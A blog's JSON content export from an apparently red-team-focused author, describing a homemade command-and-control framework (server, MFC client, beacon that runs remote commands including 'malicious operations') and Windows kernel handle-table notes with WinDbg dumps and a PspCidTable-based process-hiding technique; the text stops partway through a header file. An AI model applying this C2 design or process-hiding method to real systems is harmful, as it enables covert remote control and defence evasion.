{"meta":{"title":"Dokey_","subtitle":"","description":"","author":"Dokey_","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2023-11-11T05:46:27.143Z","updated":"2023-03-25T15:52:59.513Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"JavaScript","date":"2023-11-11T05:46:27.155Z","updated":"2023-04-01T11:55:57.964Z","comments":false,"path":"JavaScript/index.html","permalink":"http://example.com/JavaScript/index.html","excerpt":"","text":""},{"title":"","date":"2021-02-08T10:24:34.000Z","updated":"2023-03-26T16:24:07.912Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"Dokey_ Play With Reality. 有道无术, 术尚可求, 有术无道, 止于术. 神即道, 道法自然, 如来."},{"title":"分类","date":"2021-02-08T09:21:22.000Z","updated":"2023-03-25T15:41:05.443Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2021-02-08T10:24:34.000Z","updated":"2023-03-26T15:59:23.591Z","comments":false,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""},{"title":"","date":"2023-11-11T05:46:27.143Z","updated":"2023-03-26T15:57:42.370Z","comments":false,"path":"artitalk/index.html","permalink":"http://example.com/artitalk/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-02-08T09:23:45.000Z","updated":"2023-03-25T15:40:33.353Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"TodoList","date":"2024-08-01T14:53:24.842Z","updated":"2024-08-01T14:53:24.842Z","comments":false,"path":"todo/index.html","permalink":"http://example.com/todo/index.html","excerpt":"","text":"Windows(红队武器化)Windows(红队武器化) TodoList 保护进程 隐藏进程 伪装进程 JavaScriptJavaScript TodoList 学习JavaScript中this指向 学习JavaScript中闭包 学习JavaScript中原型链 学习JavaScript中词法作用域、作用链 Node.jsNode.js TodoList 学习Node.js中异步编程 学习koa web框架的使用 Windows API"},{"title":"Windows API","date":"2023-11-11T05:46:27.163Z","updated":"2023-04-01T11:39:18.745Z","comments":false,"path":"windowsAPI/index.html","permalink":"http://example.com/windowsAPI/index.html","excerpt":"","text":""},{"title":"暂时不知道写什么","date":"2023-11-11T05:46:27.163Z","updated":"2023-04-01T11:49:36.208Z","comments":false,"path":"tools/index.html","permalink":"http://example.com/tools/index.html","excerpt":"","text":""},{"title":"Windows Hook","date":"2023-11-11T05:46:27.163Z","updated":"2023-05-17T13:47:48.818Z","comments":false,"path":"windowsHook/index.html","permalink":"http://example.com/windowsHook/index.html","excerpt":"","text":""},{"title":"Windows 注入技术","date":"2023-11-11T05:46:27.163Z","updated":"2023-05-28T02:22:54.510Z","comments":false,"path":"windows注入/index.html","permalink":"http://example.com/windows%E6%B3%A8%E5%85%A5/index.html","excerpt":"","text":""},{"title":"Windows 基础","date":"2023-11-11T05:46:27.163Z","updated":"2023-05-07T03:07:06.937Z","comments":false,"path":"windows基础/index.html","permalink":"http://example.com/windows%E5%9F%BA%E7%A1%80/index.html","excerpt":"","text":""},{"title":"相册","date":"2023-11-11T05:46:27.143Z","updated":"2023-03-26T14:32:58.486Z","comments":false,"path":"custom/gallery/index.html","permalink":"http://example.com/custom/gallery/index.html","excerpt":"","text":"头像网站壁纸赛博朋克Jean Jullien"}],"posts":[{"title":"DokeyC2_Demo_v4.3","slug":"DokeyC2-Demo-v4-3","date":"2025-03-22T09:11:35.000Z","updated":"2025-03-24T08:09:26.991Z","comments":true,"path":"ed2f8944.html","link":"","permalink":"http://example.com/ed2f8944.html","excerpt":"DokeyC2已完成第一阶段demo开发, 目前实现了客户端到服务端之间的通信, 向服务端发送命令、获取监听器信息、获取被控端信息、向所有客户端推送信息; 被控端到服务端之间的通信, 向服务端获取命令执行、向服务端发送心跳包保持活跃, 向服务端发送系统信息等","text":"DokeyC2已完成第一阶段demo开发, 目前实现了客户端到服务端之间的通信, 向服务端发送命令、获取监听器信息、获取被控端信息、向所有客户端推送信息; 被控端到服务端之间的通信, 向服务端获取命令执行、向服务端发送心跳包保持活跃, 向服务端发送系统信息等 运行展示DockeyC2通信架构通信协议 C2服务端到客户端选择使用HTTPS通信，使用TLS（传输层安全协议加密通信内容）；服务端和客户端之前长连接机制来保证连接复用，在多次请求&#x2F;响应周期中复用连接，避免频繁建立和断开连接的开销，提高系统性能和响应速度。 C2服务端到被控端目前支持HTTP协议通信，因为这块后续需要根据监听器（HTTP、HTTPS、DNS）来选择并创建不同的Beacon，所以目前只实现了HTTP逻辑。 服务端（Server）服务端主要功能概述监听连接 监听4433端口，并使用线程处理每个验证通过的客户端，可以多个客户端连接到服务端 可以通过客户端在服务端创建监听器，被控端（Beacon）通过监听器连接至服务端，支持多个被控端连接到该监听器并正确处理请求 命令分发与执行 在服务端通过工厂模式来模块化处理客户端、被控端的请求，不同的请求对应不同的处理逻辑 客户端通过HTTPS请求将命令传递到服务端，服务端根据beacon_id将命令存储到对应命令队列中，并等待被控端通过请求来获取需要执行的命令 被控端通过/CommandRetrieval接口请求需要执行的命令，当获取命令后根据command_id将命令状态置为正在执行状态，当执行完并返回结果后根据command_id将命令状态置为已执行状态；保证获取命令时不会获取已执行的命令；此处将命令执行完成将命令状态置为已完成状态，暂未实现将命令删除或转存，后续可能需要获取命令执行历史记录 信息存储 客户端连接存储：使用std::unordered_map &lt;std::string, std::shared_ptr&lt;ClientSession&gt;&gt;来存储客户端session，以client_id为键，值为std::shared_ptr&lt;ClientSession&gt;；首先std::unordered_map提供了高效查找，可以通过std::mutex来实现线程安全；其次使用std::shared_ptr&lt;ClientSession&gt;可以动态管理内存，简化对象的共享和传递，避免重复传递对象；另外std::unordered_map支持快速扩展，可以轻松地添加或删除客户端会话，确保性能稳定 被控端连接存储：使用std::unordered_map&lt;std::string, std::shared_ptr&lt;Beacon&gt;&gt;来存储被控端session，以beacon_id为键，值为std::shared_ptr&lt;Beacon&gt;，使用特性和客户端连接存储同理 监听器存储：使用 std::unordered_map &lt;std::string, std::shared_ptr&lt;IListener&gt;&gt;来存储监听器信息，使用特性和客户端连接存储同理 服务端架构与代码结构服务端结构概述 C2服务端：作为指挥中心，负责接收来自客户端的命令、验证客户端身份、管理客户端连接以及向被控端下发指令。 C2客户端：用于与服务端通信的用户界面，通常负责显示当前连接的状态、管理连接、发送命令、接收执行结果等。 被控端（Beacon）：被控制的目标机器，通过 C2 服务端下发的命令执行操作，并将结果反馈给服务端。 通信流程客户端连接与认证 建立连接：C2客户端发起 HTTPS 请求，尝试与服务端建立连接。 身份验证： 客户端在请求中附带加密的身份验证信息（如用户名&#x2F;密码或密钥）。 服务端接收到请求后，解密并验证身份。 如果身份验证通过，服务端生成一个会话令牌（目前为client_id）并发送给客户端，表示身份验证成功。客户端保存此令牌并在后续的请求中使用。 如果身份验证失败，服务端返回错误响应，客户端需要重新进行身份验证。 命令交互 客户端发送命令： +客户端通过 HTTPS 向服务端发送执行命令请求（如执行 Beacon 任务、查询 Beacon 状态等）。请求中会附带会话令牌作为身份验证。 服务端处理命令： 服务端接收到请求后，验证会话令牌的有效性。 如果令牌有效，服务端根据请求内容查找对应的 Beacon，并将命令下发给目标 Beacon。 服务端等待 Beacon 返回执行结果。 Beacon执行与反馈 Beacon 接收命令： Beacon 定期向服务端发送心跳包或 Beacon 信息，表明自己在线，并接收下发的命令。 Beacon 执行命令： eacon 根据服务端下发的命令执行相应操作，并将结果返回给服务端（例如执行 Shell 命令、获取系统信息等）。 服务端反馈结果： 服务端接收到 Beacon 返回的结果后，整理并通过 HTTPS 返回给客户端。 客户端收到执行结果并显示给用户，更新客户端的状态。 代码结构12345678910111213141516171819202122232425262728DokeyC2├── Commands (命令处理模块)│ ├── Include (接口文件)| | ├── ICommand.hpp (命令基类实现)| | └── ICommandFactory.hpp (工厂模式基类实现)│ ├── ListenerCommand (监听器命令处理模块)| | └── HttpCommand.hpp / HttpCommand.cpp (http命令处理头文件 / 具体处理函数实现)│ ├── Command.hpp / Command.cpp (客户端命令处理头文件 / 具体处理函数实现)│ └── CommandFactory.hpp / CommandFactory.cpp (命令工厂模式头文件 / 具体工厂模式函数实现)├── Networks (网络通信处理模块)│ ├── Beacons (被控端)│ │ └── Beacon.hpp / Beacon.cpp (被控端头文件 / 被控端逻辑实现)│ ├── Clients (客户端)│ │ └── Client.hpp / Client.cpp (客户端头文件 / 客户端逻辑实现)│ ├── Include (接口文件)│ │ ├── IListener.hpp (监听器基类实现)│ │ └── INetworkManager.hpp (网络通信管理基类实现)│ ├── Listeners (监听器)│ │ └── HttpListener.hpp / HttpListener.cpp (http监听器头文件 / http监听器处理函数实现)│ ├── Manager (网络通信管理)│ │ ├── AuthManager.hpp (客户端身份验证头文件, 逻辑实现)│ │ └── NetworkManager.hpp / NetworkManager.cpp (网络通信管理头文件 / 网络通信管理处理函数实现)│ └── Sessions (连接处理)│ │ ├── ClientSession.hpp (客户端session处理逻辑头文件)│ │ ├── HttpSession.hpp / HttpSession.cpp (http session处理逻辑头文件 / http session处理函数实现)│ | └── ListenerSession.hpp (监听器session处理逻辑头文件)└── Tools (工具模块) └── Serialization.hpp / Serialization.cpp (处理通信序列化头文件 / 处理通信序列化逻辑实现) 服务端与客户端、Beacon通信数据验证服务端与客户端（HTTPS） 客户端发送的请求以及服务端的回应都会使用 SSL&#x2F;TLS 进行加密，保证数据传输的安全性。 服务端与客户端（HTTPS）数据验证 服务端与被控端（HTTP） 当前支持HTTP监听器, 后续添加HTTPS、DNS类型监听器 服务端与被控端（HTTP）数据验证 客户端（Client） 客户端使用 MFC 单文档开发，界面参考 cobalt strike ；自实现 C2 上版本使用 MFC基于对话框 进行客户端界面开发，在视觉效果上总觉得差强人意，在视图、数据的展示会存在很多隐藏的bug，所以选用MFC单文档进行开发，也一边学习 MFC 单文档开发模式 MFC单文档概述 MFC（Microsoft Foundation Class）是一个基于 C++ 的类库，提供了丰富的界面和功能来帮助开发 Windows 应用程序。MFC 支持多种应用程序架构，其中 单文档界面（SDI） 是最常用的一种。 单文档界面 (SDI)：在单文档界面应用程序中，通常只有一个主窗口（即主框架窗口），并且该窗口的内容或数据通过一个文档对象来管理。SDI 应用程序的特点是每次只能打开一个文档实例。 特点：简单、直观、适用于需要操作单一数据集的应用，用户界面清晰。 MFC单文档应用程序的基本结构在 MFC 单文档应用程序中，主要有以下几个关键组成部分： 文档类（CDocument）：负责应用程序的数据管理和存储。文档类通常用于存储应用程序中的核心数据（如网络连接信息、命令队列等），并提供对这些数据的操作接口。 视图类（CView）：负责显示文档中的内容，并与用户进行交互。视图类的任务是将文档中的数据可视化，提供用户与应用程序交互的界面。 框架类（CFrameWnd）：负责窗口的布局、菜单、工具栏等界面的控制。框架窗口是应用程序的主要容器，包含视图和文档的显示界面。 C2客户端设计网络连接与通信 客户端与 C2 服务端通过 HTTPS 建立连接并保持会话。使用 Boost.Beast 库来实现与服务端的通信。 建立连接：客户端在启动时通过 HTTPS 长连接与服务端进行通信，进行身份验证等。 命令发送与结果接收：客户端可以通过发送命令请求（如执行 Beacon 操作、查询 Beacon 状态等），等待服务端返回结果并显示。 关键代码 在 HttpsClient.h 中实现了对服务端的连接并进行响应解析，并且在 StartReceiveResponse 函数中对响应进行持续读取解析，并通过自定义消息（WM_HTTPS_RESPONSE）将响应发送到主框架处理 12345678910111213141516171819202122232425262728293031323334353637383940414243void StartReceiveResponse()&#123; // 清空响应正文 response_.body().clear(); // 重置响应头部和状态码 response_.clear(); // 清空缓冲区 buffer_.consume(buffer_.size()); boost::beast::http::async_read(*stream_, buffer_, response_, [this](boost::system::error_code ec, std::size_t /*length*/) &#123; if (ec) &#123; HandleError(ec, &quot;读取服务器响应失败&quot;); return; &#125; std::vector&lt;char&gt; body_data(response_.body().begin(), response_.body().end()); try &#123; Command2Server deserializedServer; std::stringstream ss(std::string(body_data.begin(), body_data.end())); boost::archive::binary_iarchive ia(ss); ia &gt;&gt; deserializedServer; if (pMainWnd_) &#123; Command2Server* pData = new Command2Server(deserializedServer); pMainWnd_-&gt;PostMessage(WM_HTTPS_RESPONSE, reinterpret_cast&lt;WPARAM&gt;(pData), 0); //手动处理消息循环, 让WM_HTTPS_RESPONSE先被处理 MSG msg; while (PeekMessage(&amp;msg, NULL, 0, 0, PM_REMOVE)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; &#125; catch (const std::exception&amp; e) &#123; CString msg; msg.Format(_T(&quot;解析响应失败: %S&quot;), e.what()); AfxOutputDebugString(msg); AfxMessageBox(msg); &#125; // 你可以继续读取响应数据 StartReceiveResponse(); &#125;);&#125; 在 MainFrm.cpp 中对响应进行细化处理，根据不同的命令类型解析出数据并传递到文档类（CDocument），通过文档类（CDocument）来通知视图类（CView）进行数据更新 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556LRESULT CMainFrame::OnHttpsResponse(WPARAM wParam, LPARAM lParam)&#123; try &#123; Command2Server* pData = reinterpret_cast&lt;Command2Server*&gt;(wParam); // 获取当前活动视图 CView* pView = GetActiveView(); if (pData &amp;&amp; pView) &#123; // 处理 pData 数据 CString cstrMessage(pData-&gt;message.c_str()); // std::string 转 CString // 获取与当前视图关联的文档 CDokeyC2Demov43ClientDoc* pDoc = dynamic_cast&lt;CDokeyC2Demov43ClientDoc*&gt;(pView-&gt;GetDocument()); AfxOutputDebugString(cstrMessage); pDoc-&gt;AddLog(cstrMessage); if (pData-&gt;command == &quot;INITIALIZE_CONNECTION&quot;) &#123; client_id_ = pData-&gt;client_id; pDoc-&gt;UpdateClientID(pData-&gt;client_id); &#125; else if(pData-&gt;command == &quot;CREATE_LISTENER&quot; || pData-&gt;command == &quot;GET_LISTENERS&quot;) &#123; // 反序列化 data 中的 ListenerInfo std::stringstream listenerDataStream(pData-&gt;data); boost::archive::binary_iarchive iaListener(listenerDataStream); ListenerInfo newListener; iaListener &gt;&gt; newListener; // 从 data 中恢复 ListenerInfo pDoc-&gt;UpdateListenerInfo(newListener); &#125; else if (pData-&gt;command == &quot;PUSH_BEACON_INFO&quot; || pData-&gt;command == &quot;GET_BEACONS&quot;) &#123; std::stringstream beaconSystemInfoDataStream(pData-&gt;data); boost::archive::binary_iarchive iaBeaconSystemInfos(beaconSystemInfoDataStream); BeaconsInfo newBeacons; iaBeaconSystemInfos &gt;&gt; newBeacons; pDoc-&gt;UpdateBeaconInfo(newBeacons); &#125; else if (pData-&gt;command == &quot;COMMAND_RESULT_REPORT&quot;) &#123; pDoc-&gt;UpdateCommandResult(*pData); &#125; else if (pData-&gt;command == &quot;UPDATE_DELAY&quot;) &#123; pDoc-&gt;UpdateBeaconUpdateDelay(*pData); &#125; &#125; delete pData; &#125; catch (const std::exception&amp; e) &#123; CString msg; msg.Format(_T(&quot;接收响应出现错误: %s&quot;), CString(e.what())); AfxMessageBox(msg); &#125; return LRESULT();&#125; 用户界面（UI）设计在主界面上，使用 SDI 架构的主窗口展示核心功能和信息。主界面通常包括以下部分： 列表控件：显示当前所有连接的 Beacon 信息，包括 Beacon ID、状态、IP 地址、用户名、计算机名、延迟等。 标签页控件：通过动态创建标签来展现不同标签页内容，包括日志标签页、监听器信息标签页、Beacon 命令执行&#x2F;执行结果展示标签页。 日志视图：显示客户端与服务端的交互日志，帮助用户了解当前操作的执行情况。使用 CRichEdit 控件展示日志信息。属于动态标签页。 监听器信息视图：属于动态标签页，显示通过客户端创建的监听器信息。 Beacon 命令操作视图：属于动态标签页，包括输入命令CRichEdit控件、执行结果展示CRichEdit控件；分别用于输入命令、展示执行结果。 界面详情DokeyC2_Demo_v4.3_Client 被控端（Beacon）Beacon主要功能定期通信（心跳和报告）Beacon 定期与 C2 服务端保持连接，以确保与控制中心的联系始终畅通。这种通信通常以 心跳包 形式进行，目的是： 确保 Beacon 仍然处于在线状态。 使得 C2 服务端能够实时监控 Beacon 的状态。 获取命令Beacon 通过 HTTP&#x2F;HTTPS&#x2F;DNS 连接到 C2 服务端并通过接口来获取命令指挥 Beacon 执行不同的任务。命令可能包括： 执行系统命令或脚本。 获取目标系统的信息（如硬件信息、操作系统版本等）。 执行命令Beacon 收到服务端的指令后，执行相应的操作。根据命令类型，Beacon 可以： 执行系统命令、shell 命令或自定义脚本。 获取并返回系统的状态信息或日志。 执行恶意操作（如删除文件、修改配置、植入后门等）。 反馈执行结果执行完命令后，Beacon 会将结果反馈给 C2 服务端。这些结果可能包括： 执行成功或失败的状态。 执行过程中的错误信息或输出结果。 执行时间、命令日志等。 TODO 后期实现功能清单 在客户端、服务端实现自动生成Beacon功能 重构Beacon代码结构, 使其结构化, 具备自动生成 服务端、客户端实现创建监听器保存至文件, 运行服务端自动加载并开启监听 支持更多监听器类型（HTTPS、DNS）","categories":[],"tags":[]},{"title":"Windows内核-私有句柄表","slug":"Windows内核-私有句柄表","date":"2024-12-01T14:16:41.000Z","updated":"2024-12-07T11:52:06.728Z","comments":true,"path":"fa796fb.html","link":"","permalink":"http://example.com/fa796fb.html","excerpt":"私有句柄表","text":"私有句柄表 知识点","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-全局句柄表","slug":"Windows内核-全局句柄表","date":"2024-11-21T12:29:57.000Z","updated":"2024-11-30T15:44:48.168Z","comments":true,"path":"7943e1e8.html","link":"","permalink":"http://example.com/7943e1e8.html","excerpt":"全局句柄表","text":"全局句柄表 知识点句柄的种类 全局句柄表: 进程、线程句柄; 私有句柄表: 进程私有的; 窗口句柄 ObTypeIndexTable: 对象类型数组_OBJECT_TYPE: 对象类型 类型_HANDLE_TABLE: 句柄表类型 如何通过进程ID在句柄表中找到进程对象 通过OpenPorcess中的参数进程ID（pid, 唯一编号）, 通过pid去全局句柄表中找到对应的进程对象, 然后把进程对象插入到进程的私有句柄表中, 从而返回一个索引号交给三环, 这就是句柄了; 进程和线程存在一张表中, 无论进程还是线程中的id都是全局句柄表中的索引号; 句柄表的地址不完全是一个地址; 当地址的尾数为0时代表它就是一张表, 默认大小为4096, 每一项为8个字节, 共能存储512项; 当地址尾数为1时代表它是一个目录, 其中共1024项, 每一项指向一张表; 当地址的尾数为2时新创建的表中每一项指向一个目录; PspCidTable不导出, 可通过IDA进行定位; 查找Dbgview进程句柄 Dbgview进程ID为600, 在任务管理器中看到的是十进制; 第一次查找（行不通） 600 &#x2F; 4 &#x3D; 150 &#x3D;&gt; 150 &#x2F; 512 &#x3D; 0（代表在第一张表中）; 600 % 512 &#x3D; 88（在表中的索引号）; 1234567891011121314151617181920212223242526272829303132333435363738kd&gt; x nt!Psp*cid*83fa0d94 nt!PspCidTable = &lt;no type information&gt;kd&gt; dd PspCidTable83fa0d94 89201080 00000000 80000020 0000010183fa0da4 800002ac 80000024 00000000 0000000083fa0db4 00000000 00000000 00000000 0000011383fa0dc4 00000000 00000000 83f4e8a4 0000000083fa0dd4 00000000 00000000 00000000 0000000883fa0de4 00000000 83fa0de8 83fa0de8 0000000083fa0df4 00000000 00000000 00000000 0000000083fa0e04 00000000 807c8c28 807c4c28 00000000kd&gt; dt _HANDLE_TABLE 89201080ntdll!_HANDLE_TABLE +0x000 TableCode : 0x984fb001 // 代表有两层 +0x004 QuotaProcess : (null) // 全局句柄表为null, 私有句柄表表示哪个进程 +0x008 UniqueProcessId : (null) // 全局句柄表为null, 私有句柄表表示哪个进程id +0x00c HandleLock : _EX_PUSH_LOCK +0x010 HandleTableList : _LIST_ENTRY [ 0x89201090 - 0x89201090 ] +0x018 HandleContentionEvent : _EX_PUSH_LOCK +0x01c DebugInfo : (null) +0x020 ExtraInfoPages : 0n0 +0x024 Flags : 1 +0x024 StrictFIFO : 0y1 +0x028 FirstFreeHandle : 0x324 +0x02c LastFreeHandleEntry : 0x89204220 _HANDLE_TABLE_ENTRY +0x030 HandleCount : 0x269 +0x034 NextHandleNeedingPool : 0x1000 +0x038 HandleCountHighWatermark : 0x2b0kd&gt; dd 0x984fb000 // 取尾数为0这张表ReadVirtual: 984fb000 not properly sign extended984fb000 89204000 984fc000 00000000 00000000984fb010 00000000 00000000 00000000 00000000984fb020 00000000 00000000 00000000 00000000984fb030 00000000 00000000 00000000 00000000984fb040 00000000 00000000 00000000 00000000984fb050 00000000 00000000 00000000 00000000984fb060 00000000 00000000 00000000 00000000984fb070 00000000 00000000 00000000 00000000 第二次查找 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485kd&gt; dd PspCidTable83fa0d94 89201080 00000000 80000020 0000010183fa0da4 800002ac 80000024 00000000 0000000083fa0db4 00000000 00000000 00000000 0000011383fa0dc4 00000000 00000000 83f4e8a4 0000000083fa0dd4 00000000 00000000 00000000 0000000883fa0de4 00000000 83fa0de8 83fa0de8 0000000083fa0df4 00000000 00000000 00000000 0000000083fa0e04 00000000 807c8c28 807c4c28 00000000kd&gt; dt _HANDLE_TABLE 89201080ntdll!_HANDLE_TABLE +0x000 TableCode : 0x984fb001 +0x004 QuotaProcess : (null) +0x008 UniqueProcessId : (null) +0x00c HandleLock : _EX_PUSH_LOCK +0x010 HandleTableList : _LIST_ENTRY [ 0x89201090 - 0x89201090 ] +0x018 HandleContentionEvent : _EX_PUSH_LOCK +0x01c DebugInfo : (null) +0x020 ExtraInfoPages : 0n0 +0x024 Flags : 1 +0x024 StrictFIFO : 0y1 +0x028 FirstFreeHandle : 0xa78 +0x02c LastFreeHandleEntry : 0x984fca70 _HANDLE_TABLE_ENTRY +0x030 HandleCount : 0x27b +0x034 NextHandleNeedingPool : 0x1000 +0x038 HandleCountHighWatermark : 0x2b0kd&gt; dq 984fb000+0x3D0*8984fce80 00000000`85d0e939 00000000`85dd09f1984fce90 00000d1c`00000000 00000f48`00000000984fcea0 00000bb8`00000000 00000ff0`00000000984fceb0 00000000`86b7a359 00000d30`00000000984fcec0 00000d18`00000000 00000000`86cd2631984fced0 00000720`00000000 00000000`86fb3331984fcee0 00000000`86d0e561 00000730`00000000984fcef0 00000adc`00000000 00000120`00000000kd&gt; dt _EPROCESS 00000000`85d0e939ntdll!_EPROCESS +0x000 Pcb : _KPROCESS +0x098 ProcessLock : _EX_PUSH_LOCK +0x0a0 CreateTime : _LARGE_INTEGER 0x0001db40`e097dfa6 +0x0a8 ExitTime : _LARGE_INTEGER 0x0 +0x0b0 RundownProtect : _EX_RUNDOWN_REF +0x0b4 UniqueProcessId : 0x7000000f Void +0x0b8 ActiveProcessLinks : _LIST_ENTRY [ 0x7883fa0d - 0xdc860192 ] +0x0c0 ProcessQuotaUsage : [2] 0x4c000016 +0x0c8 ProcessQuotaPeak : [2] 0x64000018 +0x0d0 CommitCharge : 0x40000001 +0x0d4 QuotaBlock : 0x0086a700 _EPROCESS_QUOTA_BLOCK +0x0d8 CpuQuotaBlock : (null) +0x0dc PeakVirtualSize : 0x559a0 +0x0e0 VirtualSize : 0x10055800 +0x0e4 SessionProcessLinks : _LIST_ENTRY [ 0x8c8d64a0 - 0x85dde8 ] +0x0ec DebugPort : 0xb0000000 Void +0x0f0 ExceptionPortData : 0x68869e9b Void +0x0f0 ExceptionPortValue : 0x68869e9b +0x0f0 ExceptionPortState : 0y011 +0x0f4 ObjectTable : 0x37a7c976 _HANDLE_TABLE +0x0f8 Token : _EX_FAST_REF +0x0fc WorkingSetPage : 0x2e4 +0x100 AddressCreationLock : _EX_PUSH_LOCK +0x104 RotateInProgress : (null) +0x108 ForkInProgress : (null) +0x10c HardwareTrigger : 0x18000000 +0x110 PhysicalVadRoot : 0x0086df05 _MM_AVL_TABLE +0x114 CloneRoot : 0x8b000000 Void +0x118 NumberOfPrivatePages : 1 +0x11c NumberOfLockedPages : 0xc0000000 +0x120 Win32Process : 0xc0ffa2db Void +0x124 Job : 0xa885cc24 _EJOB +0x128 SectionObject : 0x00ab5b01 Void +0x12c SectionBaseAddress : 0x7b00c300 Void +0x130 Cookie : 0x2b0cf7 +0x134 Spare8 : 0 +0x138 WorkingSetWatch : 0x40000000 _PAGEFAULT_HISTORY +0x13c Win32WindowStation : 0xac000000 Void +0x140 InheritedFromUniqueProcessId : 0x00000009 Void +0x144 LdtInformation : (null) +0x148 VdmObjects : (null) +0x14c ConsoleHostProcess : 0xe0000000 +0x150 DeviceMap : 0x008ee2f1 Void +0x154 EtwDataSource : (null) +0x158 FreeTebHint : 0x007ffdd0 Void +0x160 PageDirectoryPte : 0 +0x168 Session : 0x448d64a0 Void +0x16c ImageFileName : [15] &quot;bgview.exe&quot; 判断是进程还是线程（失败）1234567891011121314151617181920212223242526272829303132333435363738kd&gt; dt _OBJECT_HEADER 00000000`85d0e930-0x18nt!_OBJECT_HEADER +0x000 PointerCount : 0n108 +0x004 HandleCount : 0n-2080816192 +0x004 NextToFree : 0x83f943c0 Void +0x008 Lock : _EX_PUSH_LOCK +0x00c TypeIndex : 0x4 &#x27;&#x27; +0x00d TraceFlags : 0 &#x27;&#x27; +0x00e InfoMask : 0 &#x27;&#x27; +0x00f Flags : 0 &#x27;&#x27; +0x010 ObjectCreateInfo : (null) +0x010 QuotaBlockCharged : (null) +0x014 SecurityDescriptor : 0x00080007 Void +0x018 Body : _QUADkd&gt; dd ObTypeIndexTable+0x4*483fa2770 85533638 855c2040 855c2f40 855c2e7883fa2780 855c2db0 855c2ce8 855c2c20 855c254883fa2790 855ddb50 855d6418 855d6350 855d741883fa27a0 855d7350 855d8418 855d8350 855e175883fa27b0 855e1690 855e1da0 855e1cd8 855e138883fa27c0 855e12c0 855e5930 855e5868 855daf7883fa27d0 855daeb0 855da950 855da888 855da7c083fa27e0 855da6f8 855da528 855da460 855df7f0kd&gt; dt _OBJECT_TYPE 85533638ntdll!_OBJECT_TYPE +0x000 TypeList : _LIST_ENTRY [ 0x85533638 - 0x85533638 ] +0x008 Name : _UNICODE_STRING &quot;SymbolicLink&quot; +0x010 DefaultObject : 0x83fa1a40 Void +0x014 Index : 0x4 &#x27;&#x27; +0x018 TotalNumberOfObjects : 0x121 +0x01c TotalNumberOfHandles : 5 +0x020 HighWaterNumberOfObjects : 0x121 +0x024 HighWaterNumberOfHandles : 6 +0x028 TypeInfo : _OBJECT_TYPE_INITIALIZER +0x078 TypeLock : _EX_PUSH_LOCK +0x07c Key : 0x626d7953 +0x080 CallbackList : _LIST_ENTRY [ 0x855336b8 - 0x855336b8 ] 保护进程PsLookupProcessByProcessId PsLookupProcessByProcessId如何遍历进程; 调用链: PsLookupProcessByProcessId &#x3D;&gt; ExMapHandleToPointer &#x3D;&gt; ExpLookupHandleTableEntry 蓝屏错误分析 在保护进程后, 如果不把进程pid设置为0会导致蓝屏; 12345678910111213141516171819202122kd&gt; kv # ChildEBP RetAddr Args to Child 00 8d45f6f4 83f27407 00000003 7a0c3854 00000065 nt!RtlpBreakWithStatusInstruction (FPO: [1,0,0])01 8d45f744 83f27f04 00000003 857ced20 00000000 nt!KiBugCheckDebugBreak+0x1c02 8d45fb0c 83f2727b 00000017 00000000 00000000 nt!KeBugCheck2+0x68a03 8d45fb2c 840c6ca2 00000017 855d5eb0 857ced08 nt!KeBugCheck+0x1404 8d45fb64 84074b30 857ced20 857ced20 857ced08 nt!PspProcessDelete+0x185 // 此函数会进行判断然后调用ExDestroyHandle函数导致蓝屏05 8d45fb7c 83eaa1e0 00000000 00000f08 857ced08 nt!ObpRemoveObjectRoutine+0x5906 8d45fb90 83eaa150 857ced20 84097eb1 99901950 nt!ObfDereferenceObjectWithTag+0x88 (FPO: [0,0,3])07 8d45fb98 84097eb1 99901950 86b11778 00000f08 nt!ObfDereferenceObject+0xd (FPO: [0,1,0])08 8d45fbdc 84097bc5 99901950 97ffbe10 86a3fd20 nt!ObpCloseHandleTableEntry+0x22f09 8d45fc0c 84097f71 86a3fd20 86b11701 00c3f7e8 nt!ObpCloseHandle+0x7f0a 8d45fc28 83e84a3a 00000f08 00c3f7ec 76e66b94 nt!NtClose+0x4e// PspProcessDelete函数中导致蓝屏代码处... if ( *(_DWORD *)&amp;PROCESS[1].LdtDescriptor.LimitLow &amp;&amp; !ExDestroyHandle(0, (int *)PspCidTable, *(_DWORD *)&amp;PROCESS[1].LdtDescriptor.LimitLow) ) &#123; KeBugCheck(0x17u); &#125;... 利用小漏洞 ExpLookupHandleTableEntry函数中存在判断如果pid &amp; 0xFFFFFFFC &gt;&#x3D; this[13]; 123// ExpLookupHandleTableEntry函数中判断处 if ( (a2 &amp; 0xFFFFFFFC) &gt;= this[13] ) return 0; 实验代码 ProcessProtection.h 12345678910#pragma once#include &lt;ntifs.h&gt;// PVOID GetPspCidTable();// ULONG_PTR GetExpLookupHandleTableEntry();PVOID MyExpLookupHandleTableEntry(HANDLE pid);// 保护进程BOOLEAN ProcessProtection(HANDLE pid); Search.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#pragma once#include &lt;ntifs.h&gt;typedef struct _FindCode&#123; UCHAR code[0x200]; ULONG len; int offset; ULONG lastAddressOffset;&#125;FindCode, *PFindCode;typedef enum _SYSTEM_INFORMATION_CLASS &#123; SystemBasicInformation, SystemProcessorInformation, // obsolete...delete SystemPerformanceInformation, SystemTimeOfDayInformation, SystemPathInformation, SystemProcessInformation, SystemCallCountInformation, SystemDeviceInformation, SystemProcessorPerformanceInformation, SystemFlagsInformation, SystemCallTimeInformation, SystemModuleInformation, SystemLocksInformation, SystemStackTraceInformation, SystemPagedPoolInformation, SystemNonPagedPoolInformation, 